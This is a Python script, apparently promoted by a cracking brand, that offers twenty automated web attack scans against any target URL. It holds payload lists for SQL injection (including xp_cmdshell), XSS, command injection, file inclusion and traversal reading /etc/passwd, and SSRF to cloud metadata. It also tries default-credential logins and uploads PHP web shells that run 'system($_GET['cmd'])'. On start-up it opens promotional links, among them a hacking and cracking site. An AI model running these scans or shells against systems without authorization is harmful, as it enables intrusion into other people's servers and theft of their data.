#!/usr/bin/env python3
"""
Advanced Cybersecurity Testing Toolkit
Brand: darkboss1bd
Professional security testing tools for various vulnerabilities
"""

import os
import sys
import time
import requests
import socket
import threading
import webbrowser
from urllib.parse import urljoin, urlparse, quote
import json
import random
import string
from bs4 import BeautifulSoup
import hashlib
import base64
import subprocess
import argparse
import urllib3
from concurrent.futures import ThreadPoolExecutor
import dns.resolver

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class DarkBossAdvancedToolkit:
    def __init__(self):
        self.target_url = ""
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.vulnerabilities_found = []
        
    def display_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{Colors.RED}{Colors.BOLD}
    ╔════════════════════════════════════════════════════════════════════════╗
    ║                                                                        ║
    ║  ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ███████╗ ███████╗   ║
    ║  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔═══██╗██╔════╝ ██╔════╝   ║
    ║  ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║   ██║███████╗ ███████╗   ║
    ║  ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║╚════██║ ╚════██║   ║
    ║  ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝███████║ ███████║   ║
    ║  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝ ╚══════╝   ║
    ║                                                                        ║
    ║               {Colors.CYAN}ADVANCED SECURITY TESTING TOOLKIT{Colors.RED}                  ║
    ║                        {Colors.YELLOW}Brand: darkboss1bd{Colors.RED}                           ║
    ║                                                                        ║
    ╚════════════════════════════════════════════════════════════════════════╝
    
    {Colors.GREEN}╔════════════════════════════════════════════════════════════════════════╗
    {Colors.GREEN}║                           CONTACT INFORMATION                          ║
    {Colors.GREEN}║                                                                        ║
    {Colors.BLUE}║   Telegram ID: https://t.me/darkvaiadmin                               ║
    {Colors.PURPLE}║   Telegram Channel: https://t.me/windowspremiumkey                     ║
    {Colors.CYAN}║   Hacking/Cracking Website: https://crackyworld.com/                   ║
    {Colors.GREEN}╚════════════════════════════════════════════════════════════════════════╝{Colors.END}
        """)
    
    def initialize_toolkit(self):
        """Initialize the toolkit and open brand links"""
        print(f"{Colors.YELLOW}[*] Initializing DarkBoss Toolkit...{Colors.END}")
        time.sleep(1)
        self.open_brand_links()
        print(f"{Colors.GREEN}[+] Toolkit initialized successfully!{Colors.END}")
        time.sleep(1)
    
    def open_brand_links(self):
        """Automatically open brand links"""
        links = [
            "https://t.me/darkvaiadmin",
            "https://t.me/windowspremiumkey", 
            "https://crackyworld.com/"
        ]
        
        print(f"{Colors.YELLOW}[*] Opening brand links...{Colors.END}")
        for link in links:
            try:
                webbrowser.open(link)
                time.sleep(2)
            except Exception as e:
                print(f"{Colors.RED}[-] Could not open {link}: {e}{Colors.END}")
    
    def test_connection(self, url):
        """Test connection to target URL"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            return response.status_code == 200
        except:
            return False
    
    # ==================== TOOL 1: SQL INJECTION ====================
    def sql_injection_scan(self, url):
        """Advanced SQL Injection Scanner"""
        print(f"\n{Colors.CYAN}[1] Starting SQL Injection Scan...{Colors.END}")
        
        sql_payloads = [
            "'", 
            "';", 
            "' OR '1'='1", 
            "' OR 1=1--", 
            "' UNION SELECT 1,2,3--",
            "' AND 1=2 UNION SELECT 1,2,3--",
            "' OR 1=1 IN (SELECT @@version)--",
            "'; EXEC xp_cmdshell('dir')--",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' OR 1=1 IN (SELECT USERNAME FROM USERS)--"
        ]
        
        sql_errors = [
            "sql syntax", "mysql", "oracle", "microsoft odbc", "postgresql",
            "warning", "error", "undefined", "sql", "database", "query failed"
        ]
        
        vulnerable_points = []
        
        # Test URL parameters
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in sql_payloads:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={payload}"
                        try:
                            response = self.session.get(test_url, timeout=8, verify=False)
                            
                            # Check for SQL errors
                            if any(error in response.text.lower() for error in sql_errors):
                                print(f"{Colors.RED}[VULNERABLE] SQL Injection found in parameter: {key}{Colors.END}")
                                print(f"{Colors.YELLOW}[PAYLOAD] {payload}{Colors.END}")
                                vulnerable_points.append(f"Parameter: {key} - Payload: {payload}")
                                break
                                
                        except Exception as e:
                            continue
        
        if vulnerable_points:
            self.vulnerabilities_found.extend([f"SQL Injection: {point}" for point in vulnerable_points])
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No SQL Injection vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 2: IDOR SCAN ====================
    def idor_scan(self, url):
        """Insecure Direct Object Reference Scanner"""
        print(f"\n{Colors.CYAN}[2] Starting IDOR Scan...{Colors.END}")
        
        test_ids = ["1", "2", "10", "100", "1000", "9999", "admin", "test", "user"]
        found_resources = []
        
        for test_id in test_ids:
            test_urls = [
                f"{url}/user/{test_id}",
                f"{url}/profile/{test_id}",
                f"{url}/account/{test_id}",
                f"{url}/id/{test_id}",
                f"{url}/document/{test_id}",
                f"{url}/file/{test_id}"
            ]
            
            for test_url in test_urls:
                try:
                    response = self.session.get(test_url, timeout=8, verify=False)
                    if response.status_code == 200:
                        content_length = len(response.content)
                        if content_length > 100:  # Avoid empty responses
                            print(f"{Colors.YELLOW}[INFO] Accessible resource: {test_url} ({content_length} bytes){Colors.END}")
                            found_resources.append(test_url)
                except:
                    continue
        
        if found_resources:
            self.vulnerabilities_found.extend([f"IDOR: {resource}" for resource in found_resources])
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No obvious IDOR vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 3: BROKEN AUTHENTICATION ====================
    def broken_auth_scan(self, url):
        """Broken Authentication Scanner"""
        print(f"\n{Colors.CYAN}[3] Starting Broken Authentication Scan...{Colors.END}")
        
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('user', 'user'),
            ('administrator', 'password'),
            ('admin', 'admin123')
        ]
        
        login_endpoints = [
            '/login',
            '/admin',
            '/admin/login',
            '/wp-login.php',
            '/administrator',
            '/signin',
            '/auth'
        ]
        
        found_vulnerabilities = []
        
        for endpoint in login_endpoints:
            login_url = urljoin(url, endpoint)
            
            # Check if login page exists
            try:
                response = self.session.get(login_url, timeout=8, verify=False)
                if response.status_code == 200 and any(keyword in response.text.lower() for keyword in ['login', 'password', 'username']):
                    print(f"{Colors.YELLOW}[INFO] Found login page: {login_url}{Colors.END}")
                    
                    # Test default credentials
                    for username, password in common_credentials:
                        login_data = {
                            'username': username,
                            'password': password,
                            'email': username,
                            'user': username
                        }
                        
                        try:
                            response = self.session.post(login_url, data=login_data, timeout=8, verify=False)
                            if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout', 'success']):
                                print(f"{Colors.RED}[VULNERABLE] Default credentials work: {username}:{password}{Colors.END}")
                                found_vulnerabilities.append(f"Default credentials: {username}:{password} at {login_url}")
                                break
                        except:
                            continue
            except:
                continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No broken authentication vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 4: FILE UPLOAD ====================
    def file_upload_scan(self, url):
        """Unrestricted File Upload Scanner"""
        print(f"\n{Colors.CYAN}[4] Starting File Upload Scan...{Colors.END}")
        
        upload_endpoints = [
            '/upload',
            '/file-upload',
            '/upload.php',
            '/upload-file',
            '/admin/upload',
            '/image/upload'
        ]
        
        malicious_files = {
            'shell.php': "<?php echo 'VULNERABLE'; system($_GET['cmd']); ?>",
            'test.jpg.php': "GIF89a<?php system($_GET['cmd']); ?>",
            'shell.asp': "<% Response.Write('VULNERABLE') %>",
            'test.html': "<html><body><script>alert('XSS')</script></body></html>"
        }
        
        found_vulnerabilities = []
        
        for endpoint in upload_endpoints:
            upload_url = urljoin(url, endpoint)
            
            try:
                # Check if upload page exists
                response = self.session.get(upload_url, timeout=8, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.YELLOW}[INFO] Found upload page: {upload_url}{Colors.END}")
                    
                    # Test file upload
                    for filename, content in malicious_files.items():
                        files = {'file': (filename, content, 'application/octet-stream')}
                        data = {'submit': 'upload'}
                        
                        try:
                            response = self.session.post(upload_url, files=files, data=data, timeout=10, verify=False)
                            
                            if response.status_code == 200:
                                if 'VULNERABLE' in response.text or 'success' in response.text.lower():
                                    print(f"{Colors.RED}[VULNERABLE] File upload possible: {filename}{Colors.END}")
                                    found_vulnerabilities.append(f"File upload: {filename} at {upload_url}")
                        except:
                            continue
            except:
                continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No file upload vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 5: XSS SCAN ====================
    def xss_scan(self, url):
        """Cross-Site Scripting Scanner"""
        print(f"\n{Colors.CYAN}[5] Starting XSS Scan...{Colors.END}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        found_vulnerabilities = []
        
        # Test URL parameters
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in xss_payloads:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={quote(payload)}"
                        try:
                            response = self.session.get(test_url, timeout=8, verify=False)
                            
                            # Check if payload is reflected
                            if payload in response.text:
                                print(f"{Colors.RED}[VULNERABLE] XSS found in parameter: {key}{Colors.END}")
                                print(f"{Colors.YELLOW}[PAYLOAD] {payload}{Colors.END}")
                                found_vulnerabilities.append(f"XSS in parameter: {key}")
                                break
                                
                        except Exception as e:
                            continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No XSS vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 6: CSRF SCAN ====================
    def csrf_scan(self, url):
        """CSRF Vulnerability Scanner"""
        print(f"\n{Colors.CYAN}[6] Starting CSRF Scan...{Colors.END}")
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            csrf_vulnerable = []
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                if form_method == 'post':
                    csrf_token = form.find('input', {'name': ['csrf', 'csrf_token', 'csrfmiddlewaretoken', '_token']})
                    
                    if not csrf_token:
                        print(f"{Colors.YELLOW}[INFO] Potential CSRF vulnerability in form: {form_action}{Colors.END}")
                        csrf_vulnerable.append(form_action)
            
            if csrf_vulnerable:
                self.vulnerabilities_found.extend([f"CSRF: {form}" for form in csrf_vulnerable])
                return True
            else:
                print(f"{Colors.GREEN}[SAFE] No obvious CSRF vulnerabilities detected{Colors.END}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] CSRF scan failed: {e}{Colors.END}")
            return False
    
    # ==================== TOOL 7: RCE SCAN ====================
    def rce_scan(self, url):
        """Remote Code Execution Scanner"""
        print(f"\n{Colors.CYAN}[7] Starting RCE Scan...{Colors.END}")
        
        rce_payloads = [
            "; whoami",
            "| whoami", 
            "&& whoami",
            "`whoami`",
            "$(whoami)",
            "{{7*7}}",
            "{7*7}"
        ]
        
        found_vulnerabilities = []
        
        # Test command injection in parameters
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in rce_payloads:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}=test{quote(payload)}"
                        try:
                            response = self.session.get(test_url, timeout=8, verify=False)
                            
                            # Check for command execution indicators
                            if any(indicator in response.text for indicator in ['root', 'admin', 'www-data', 'nt authority']):
                                print(f"{Colors.RED}[VULNERABLE] RCE possible in parameter: {key}{Colors.END}")
                                print(f"{Colors.YELLOW}[PAYLOAD] {payload}{Colors.END}")
                                found_vulnerabilities.append(f"RCE in parameter: {key}")
                                break
                                
                        except Exception as e:
                            continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No RCE vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 8: LFI SCAN ====================
    def lfi_scan(self, url):
        """Local File Inclusion Scanner"""
        print(f"\n{Colors.CYAN}[8] Starting LFI Scan...{Colors.END}")
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        found_vulnerabilities = []
        
        # Test LFI in parameters
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in lfi_payloads:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={quote(payload)}"
                        try:
                            response = self.session.get(test_url, timeout=8, verify=False)
                            
                            # Check for file content indicators
                            if any(indicator in response.text for indicator in ['root:', 'Administrator', 'localhost', '127.0.0.1']):
                                print(f"{Colors.RED}[VULNERABLE] LFI found in parameter: {key}{Colors.END}")
                                print(f"{Colors.YELLOW}[PAYLOAD] {payload}{Colors.END}")
                                found_vulnerabilities.append(f"LFI in parameter: {key}")
                                break
                                
                        except Exception as e:
                            continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No LFI vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 9: RFI SCAN ====================
    def rfi_scan(self, url):
        """Remote File Inclusion Scanner"""
        print(f"\n{Colors.CYAN}[9] Starting RFI Scan...{Colors.END}")
        
        # Using a test payload that would show if inclusion works
        rfi_payloads = [
            "http://google.com",
            "https://raw.githubusercontent.com/robots.txt"
        ]
        
        found_vulnerabilities = []
        
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in rfi_payloads:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={quote(payload)}"
                        try:
                            response = self.session.get(test_url, timeout=8, verify=False)
                            
                            # Check if external content is included
                            if 'google' in response.text.lower() or 'github' in response.text.lower():
                                print(f"{Colors.RED}[VULNERABLE] RFI possible in parameter: {key}{Colors.END}")
                                found_vulnerabilities.append(f"RFI in parameter: {key}")
                                break
                                
                        except Exception as e:
                            continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No RFI vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 10: DIRECTORY TRAVERSAL ====================
    def directory_traversal_scan(self, url):
        """Directory Traversal Scanner"""
        print(f"\n{Colors.CYAN}[10] Starting Directory Traversal Scan...{Colors.END}")
        
        traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//....//etc/passwd"
        ]
        
        found_vulnerabilities = []
        
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in traversal_payloads:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={payload}"
                        try:
                            response = self.session.get(test_url, timeout=8, verify=False)
                            
                            if 'root:' in response.text or 'Administrator' in response.text:
                                print(f"{Colors.RED}[VULNERABLE] Directory Traversal in parameter: {key}{Colors.END}")
                                found_vulnerabilities.append(f"Directory Traversal in parameter: {key}")
                                break
                                
                        except Exception as e:
                            continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No directory traversal vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 11: SSRF SCAN ====================
    def ssrf_scan(self, url):
        """Server-Side Request Forgery Scanner"""
        print(f"\n{Colors.CYAN}[11] Starting SSRF Scan...{Colors.END}")
        
        ssrf_payloads = [
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]
        
        found_vulnerabilities = []
        
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    for payload in ssrf_payloads:
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={quote(payload)}"
                        try:
                            response = self.session.get(test_url, timeout=8, verify=False)
                            
                            if response.status_code != 400 and response.status_code != 403:
                                if len(response.text) > 0:
                                    print(f"{Colors.YELLOW}[INFO] Potential SSRF in parameter: {key}{Colors.END}")
                                    found_vulnerabilities.append(f"Potential SSRF in parameter: {key}")
                                    break
                                
                        except Exception as e:
                            continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No SSRF vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 12: SECURITY MISCONFIGURATION ====================
    def security_misconfig_scan(self, url):
        """Security Misconfiguration Scanner"""
        print(f"\n{Colors.CYAN}[12] Starting Security Misconfiguration Scan...{Colors.END}")
        
        sensitive_paths = [
            '/.git/',
            '/.env',
            '/backup/',
            '/admin/',
            '/phpinfo.php',
            '/test/',
            '/debug/',
            '/config.json',
            '/.htaccess',
            '/web.config',
            '/robots.txt',
            '/sitemap.xml',
            '/.DS_Store'
        ]
        
        found_exposures = []
        
        for path in sensitive_paths:
            test_url = urljoin(url, path)
            try:
                response = self.session.get(test_url, timeout=8, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.YELLOW}[INFO] Sensitive path accessible: {test_url}{Colors.END}")
                    found_exposures.append(test_url)
            except:
                continue
        
        if found_exposures:
            self.vulnerabilities_found.extend([f"Exposed path: {path}" for path in found_exposures])
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No security misconfigurations detected{Colors.END}")
            return False
    
    # ==================== TOOL 13: SUBDOMAIN TAKEOVER ====================
    def subdomain_takeover_scan(self, domain):
        """Subdomain Takeover Scanner"""
        print(f"\n{Colors.CYAN}[13] Starting Subdomain Takeover Scan...{Colors.END}")
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'staging',
            'dev', 'api', 'admin', 'blog', 'shop', 'forum', 'support', 'help'
        ]
        
        found_subdomains = []
        
        for sub in common_subdomains:
            subdomain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                print(f"{Colors.YELLOW}[INFO] Subdomain found: {subdomain} -> {ip}{Colors.END}")
                found_subdomains.append(subdomain)
            except:
                continue
        
        if found_subdomains:
            self.vulnerabilities_found.extend([f"Subdomain: {sub}" for sub in found_subdomains])
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No subdomains found for takeover{Colors.END}")
            return False
    
    # ==================== TOOL 14: OPEN REDIRECT ====================
    def open_redirect_scan(self, url):
        """Open Redirect Vulnerability Scanner"""
        print(f"\n{Colors.CYAN}[14] Starting Open Redirect Scan...{Colors.END}")
        
        redirect_payloads = [
            "http://google.com",
            "https://evil.com",
            "//google.com",
            "\/\/google.com"
        ]
        
        found_vulnerabilities = []
        
        if '?' in url:
            parsed_url = urlparse(url)
            params = parsed_url.query.split('&')
            
            for param in params:
                if '=' in param:
                    key = param.split('=')[0]
                    if any(redirect_keyword in key.lower() for redirect_keyword in ['url', 'redirect', 'next', 'return']):
                        for payload in redirect_payloads:
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{key}={quote(payload)}"
                            try:
                                response = self.session.get(test_url, timeout=8, verify=False, allow_redirects=False)
                                
                                if response.status_code in [301, 302, 303, 307, 308]:
                                    location = response.headers.get('Location', '')
                                    if payload in location:
                                        print(f"{Colors.RED}[VULNERABLE] Open redirect in parameter: {key}{Colors.END}")
                                        found_vulnerabilities.append(f"Open redirect in parameter: {key}")
                                        break
                                
                            except Exception as e:
                                continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No open redirect vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 15: CLICKJACKING ====================
    def clickjacking_scan(self, url):
        """Clickjacking Vulnerability Scanner"""
        print(f"\n{Colors.CYAN}[15] Starting Clickjacking Scan...{Colors.END}")
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            headers = response.headers
            
            clickjacking_protected = False
            
            if 'X-Frame-Options' in headers:
                print(f"{Colors.GREEN}[SAFE] X-Frame-Options header present: {headers['X-Frame-Options']}{Colors.END}")
                clickjacking_protected = True
            
            if 'Content-Security-Policy' in headers and 'frame-ancestors' in headers['Content-Security-Policy']:
                print(f"{Colors.GREEN}[SAFE] CSP frame-ancestors present{Colors.END}")
                clickjacking_protected = True
            
            if not clickjacking_protected:
                print(f"{Colors.RED}[VULNERABLE] Clickjacking possible - No X-Frame-Options or CSP frame-ancestors{Colors.END}")
                self.vulnerabilities_found.append("Clickjacking: No frame protection headers")
                return True
            else:
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] Clickjacking scan failed: {e}{Colors.END}")
            return False
    
    # ==================== TOOL 16: HOST HEADER INJECTION ====================
    def host_header_injection_scan(self, url):
        """Host Header Injection Scanner"""
        print(f"\n{Colors.CYAN}[16] Starting Host Header Injection Scan...{Colors.END}")
        
        malicious_hosts = [
            'evil.com',
            'localhost',
            '127.0.0.1',
            'example.com'
        ]
        
        found_vulnerabilities = []
        
        for malicious_host in malicious_hosts:
            try:
                headers = {'Host': malicious_host}
                response = self.session.get(url, headers=headers, timeout=8, verify=False)
                
                if malicious_host in response.text:
                    print(f"{Colors.RED}[VULNERABLE] Host header injection possible{Colors.END}")
                    found_vulnerabilities.append(f"Host header injection with: {malicious_host}")
                    break
                    
            except Exception as e:
                continue
        
        if found_vulnerabilities:
            self.vulnerabilities_found.extend(found_vulnerabilities)
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No host header injection vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 17: SENSITIVE DATA EXPOSURE ====================
    def sensitive_data_exposure_scan(self, url):
        """Sensitive Data Exposure Scanner"""
        print(f"\n{Colors.CYAN}[17] Starting Sensitive Data Exposure Scan...{Colors.END}")
        
        sensitive_keywords = [
            'password', 'api_key', 'secret', 'token', 'key', 'credential',
            'auth', 'login', 'admin', 'private', 'confidential'
        ]
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            response_text = response.text.lower()
            
            found_exposures = []
            
            for keyword in sensitive_keywords:
                if keyword in response_text:
                    print(f"{Colors.YELLOW}[INFO] Sensitive keyword found: {keyword}{Colors.END}")
                    found_exposures.append(keyword)
            
            # Check for common API keys patterns
            import re
            api_key_patterns = [
                r'[a-zA-Z0-9]{32}',
                r'sk_live_[0-9a-zA-Z]{24}',
                r'AKIA[0-9A-Z]{16}',
                r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
            ]
            
            for pattern in api_key_patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    for match in matches:
                        print(f"{Colors.RED}[VULNERABLE] Possible API key exposed: {match}{Colors.END}")
                        found_exposures.append(f"API key: {match}")
            
            if found_exposures:
                self.vulnerabilities_found.extend([f"Sensitive data: {exp}" for exp in found_exposures])
                return True
            else:
                print(f"{Colors.GREEN}[SAFE] No sensitive data exposure detected{Colors.END}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] Sensitive data scan failed: {e}{Colors.END}")
            return False
    
    # ==================== TOOL 18: OUTDATED SOFTWARE ====================
    def outdated_software_scan(self, url):
        """Outdated Software/Libraries Scanner"""
        print(f"\n{Colors.CYAN}[18] Starting Outdated Software Scan...{Colors.END}")
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            headers = response.headers
            
            # Check server header
            server = headers.get('Server', '')
            if server:
                print(f"{Colors.YELLOW}[INFO] Server detected: {server}{Colors.END}")
            
            # Check for common outdated software indicators
            outdated_indicators = [
                'WordPress', 'Joomla', 'Drupal', 'phpMyAdmin', 'Apache', 'nginx'
            ]
            
            found_software = []
            
            for software in outdated_indicators:
                if software.lower() in response.text.lower() or software.lower() in server.lower():
                    print(f"{Colors.YELLOW}[INFO] {software} detected{Colors.END}")
                    found_software.append(software)
            
            if found_software:
                self.vulnerabilities_found.extend([f"Software detected: {software}" for software in found_software])
                return True
            else:
                print(f"{Colors.GREEN}[SAFE] No obvious outdated software detected{Colors.END}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] Outdated software scan failed: {e}{Colors.END}")
            return False
    
    # ==================== TOOL 19: BROKEN ACCESS CONTROL ====================
    def broken_access_control_scan(self, url):
        """Broken Access Control Scanner"""
        print(f"\n{Colors.CYAN}[19] Starting Broken Access Control Scan...{Colors.END}")
        
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/dashboard', 
            '/control-panel', '/manager', '/webadmin'
        ]
        
        found_access = []
        
        for path in admin_paths:
            test_url = urljoin(url, path)
            try:
                response = self.session.get(test_url, timeout=8, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.YELLOW}[INFO] Admin panel accessible: {test_url}{Colors.END}")
                    found_access.append(test_url)
            except:
                continue
        
        if found_access:
            self.vulnerabilities_found.extend([f"Admin access: {path}" for path in found_access])
            return True
        else:
            print(f"{Colors.GREEN}[SAFE] No broken access control vulnerabilities detected{Colors.END}")
            return False
    
    # ==================== TOOL 20: BUSINESS LOGIC FLAWS ====================
    def business_logic_flaws_scan(self, url):
        """Business Logic Flaws Scanner"""
        print(f"\n{Colors.CYAN}[20] Starting Business Logic Flaws Scan...{Colors.END}")
        
        # This is a basic check - business logic flaws often require manual testing
        print(f"{Colors.YELLOW}[INFO] Business logic flaws require manual testing{Colors.END}")
        print(f"{Colors.YELLOW}[INFO] Check for: Price manipulation, workflow bypass, privilege escalation{Colors.END}")
        
        # Basic price manipulation test
        test_data = {
            'price': '0',
            'quantity': '-1',
            'total': '0.01'
        }
        
        print(f"{Colors.YELLOW}[INFO] Manual testing recommended for business logic flaws{Colors.END}")
        return False
    
    # ==================== MAIN MENU ====================
    def display_menu(self):
        """Display main menu"""
        print(f"""
    {Colors.GREEN}╔════════════════════════════════════════════════════════════════════════╗
    {Colors.GREEN}║                         AVAILABLE TOOLS                               ║
    {Colors.GREEN}╠════════════════════════════════════════════════════════════════════════╣
    {Colors.GREEN}║  1.  SQL Injection Scan                   11. SSRF Scan               ║
    {Colors.BLUE}║  2.  IDOR Scan                            12. Security Misconfig      ║
    {Colors.YELLOW}║  3.  Broken Authentication               13. Subdomain Takeover       ║
    {Colors.PURPLE}║  4.  File Upload Scan                    14. Open Redirect           ║
    {Colors.CYAN}║  5.  XSS Scan                            15. Clickjacking            ║
    {Colors.WHITE}║  6.  CSRF Scan                           16. Host Header Injection   ║
    {Colors.RED}║  7.  RCE Scan                            17. Sensitive Data Exposure ║
    {Colors.GREEN}║  8.  LFI Scan                            18. Outdated Software       ║
    {Colors.BLUE}║  9.  RFI Scan                            19. Broken Access Control   ║
    {Colors.YELLOW}║  10. Directory Traversal                 20. Business Logic Flaws    ║
    {Colors.GREEN}╠════════════════════════════════════════════════════════════════════════╣
    {Colors.CYAN}║  21. Run All Scans                       22. Set Target URL          ║
    {Colors.PURPLE}║  23. Show Found Vulnerabilities         24. Clear Results           ║
    {Colors.RED}║  25. Exit Toolkit                                                  ║
    {Colors.GREEN}╚════════════════════════════════════════════════════════════════════════╝{Colors.END}
        """)
    
    def run_all_scans(self):
        """Run all security scans"""
        if not self.target_url:
